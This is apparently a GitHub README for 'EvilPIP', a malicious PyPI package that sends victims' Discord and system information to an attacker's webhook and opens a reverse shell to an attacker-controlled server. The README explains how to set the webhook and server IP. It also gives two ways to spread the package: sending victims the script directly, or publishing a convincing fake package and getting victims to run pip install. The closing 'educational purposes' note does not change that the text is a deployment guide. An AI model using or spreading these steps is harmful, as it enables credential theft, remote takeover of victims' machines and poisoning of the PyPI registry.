# EvilPIP 👿
**EvilPIP is a Malicious PyPi Module/Malware with Discord Information Logger and Socket Reverse Shell**

**What is Does:**
- Takes advantage of the fact that python has administrative privileges, therefore so do PyPi packages
- When executed, will gather system and discord information from the machine.
- If the reverse shell option is enabled, the program will make the machine connect to your reverse shell

# Usage 💻
Edit the ***VARIABLES*** class with your information
```py
In '__main__.py' only {
    set 'webhook' to your Discord webhook
    set 'REVSHELL' to False if you don't want the reverse shell
    set 'REVSHELL' to True if you want the reverse shell
}
In '__main__.py' and 'server/server.py' {
    Set 'serverip' to your host/VPS IP for the victim to connect to
    Set 'port' to the port you want the victim to connect to (optional)
    Set 'buffer' to the buffer size (in bytes) that you want to send (optional)
}
```
If **REVSHELL** is enabled and you want the victim to connect to the reverse shell -

    Port-Forward on the port you had chosen (look up a tutorial for your router/VPS)

**When these steps are completed to your liking, you can move onto the distribution process**

# Distribution methods 💾

**If you set REVSHELL to True: Open 'server/server/server.py' on your own machine/VPS to wait for a reverse shell connection**

**Method 1: Sending file directly (only works if they have the dependencies)**
- Rename and encrypt (optional) the '__ main __.py' file
- Send the file to someone directly and wait for a connection
- When opened, evilpip should be executed

**Method 2: PyPi Package**
- Upload the package to PyPi and make it look convincing (requires experience)
- Get someone to run these commands (evilpip = your pypi package name):

      pip install evilpip
      python -m evilpip

# Showcase 📷

**Information sent to Discord webhook and reverse shell connected:**

![image](https://user-images.githubusercontent.com/75194878/166561205-b6f84821-f308-4418-a9e3-3f558d8b7026.png)
![image](https://user-images.githubusercontent.com/75194878/166560928-2075231d-32a0-47ac-a2d8-71d0f4853118.png)
![image](https://user-images.githubusercontent.com/75194878/166560636-025771c9-5325-4e10-b985-b3a10bcd4727.png)

# Final Notes 📝
This project was made for educational purposes only, to demonstrate -
- That you shouldn't trust all PyPi packages as there can be malicious code in them
- How easy it is to execute said malicious code, and that you don't need to download anything online
- How the logger and reverse shell were made

To support this repository, star it, and to contribute to it, please fork it with any useful additions.
